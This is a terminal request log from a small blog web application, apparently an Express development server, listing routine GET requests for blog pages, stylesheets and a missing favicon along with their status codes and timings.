[0mGET /css/bootstrap.min.css [32m200 [0m5.544 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.964 ms - 1418[0m
[0mGET /blogs [32m200 [0m0.990 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.056 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.154 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.838 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m1.651 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.706 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.944 ms - -[0m
[0mGET /blogs/delete [36m304 [0m0.924 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.339 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.406 ms - -[0m
[0mGET /blogs [32m200 [0m1.169 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m0.496 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.593 ms - 160302[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.561 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.868 ms - 1418[0m
[0mGET / [32m200 [0m2.162 ms - 844[0m
[0mGET /blogs [32m200 [0m2.228 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.247 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.361 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.026 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.068 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m0.415 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.726 ms - 160302[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.595 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.839 ms - 1418[0m
[0mGET /blogs [32m200 [0m4.619 ms - 2277[0m
[0mGET /stylesheets/style.css [32m200 [0m2.513 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m5.993 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.526 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.336 ms - 2277[0m
[0mGET /stylesheets/style.css [32m200 [0m0.489 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.542 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.937 ms - 1418[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m1.922 ms - -[0m
[0mGET /blogs [32m200 [0m1.014 ms - 2277[0m
[0mGET /stylesheets/style.css [32m200 [0m1.085 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.214 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.850 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.033 ms - 2277[0m
[0mGET /stylesheets/style.css [32m200 [0m0.544 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.612 ms - 160302[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.582 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.907 ms - 1418[0m
[0mGET /blogs [32m200 [0m3.349 ms - 2338[0m
[0mGET /stylesheets/style.css [32m200 [0m1.148 ms - 312[0m
[0mGET /css/fontawesome-all.css [33m404 [0m7.141 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.245 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.890 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.279 ms - 2338[0m
[0mGET /stylesheets/style.css [32m200 [0m1.364 ms - 312[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.640 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.621 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.968 ms - 1418[0m
[0mGET /blogs [32m200 [0m7.867 ms - 2332[0m
[0mGET /stylesheets/style.css [32m200 [0m0.835 ms - 312[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.018 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.114 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.922 ms - 1418[0m
[0mGET /blogs [32m200 [0m2.788 ms - 2320[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.579 ms - 963[0m
[0mGET /stylesheets/style.css [32m200 [0m2.635 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.410 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.942 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.962 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.062 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.226 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.970 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m2.823 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.384 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.445 ms - -[0m
[0mGET /blogs/delete [36m304 [0m1.651 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.645 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.899 ms - -[0m
[0mGET / [32m200 [0m4.372 ms - 844[0m
[0mGET /stylesheets/style.css [32m200 [0m0.409 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.720 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.021 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.047 ms - 2250[0m
[0mGET /stylesheets/style.css [36m304 [0m0.371 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.485 ms - -[0m
[0mGET /blogs/add [32m200 [0m2.517 ms - 771[0m
[0mGET /stylesheets/style.css [36m304 [0m0.448 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.464 ms - -[0m
[0mGET /blogs [36m304 [0m1.030 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.308 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.407 ms - -[0m
[0mGET /blogs/edit [32m200 [0m0.877 ms - 772[0m
[0mGET /stylesheets/style.css [36m304 [0m0.512 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m4.328 ms - -[0m
[0mGET /blogs [36m304 [0m1.812 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.357 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.446 ms - -[0m
[0mGET /blogs [32m200 [0m1.190 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m0.888 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.062 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.933 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m1.093 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.334 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.390 ms - -[0m
[0mGET / [36m304 [0m1.890 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.415 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.416 ms - -[0m
[0mGET /blogs [36m304 [0m2.962 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.365 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.420 ms - -[0m
[0mGET /blogs/delete [36m304 [0m0.910 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.334 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.425 ms - -[0m
[0mGET /blogs [36m304 [0m1.110 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.654 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.641 ms - -[0m
[0mGET /blogs/edit [36m304 [0m1.633 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.356 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.421 ms - -[0m
[0mGET /blogs [32m200 [0m0.987 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m0.497 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.583 ms - 160302[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.504 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.821 ms - 1418[0m
[0mGET / [36m304 [0m1.028 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.328 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.429 ms - -[0m
[0mGET /blogs/add [32m200 [0m0.882 ms - 771[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.343 ms - 160302[0m
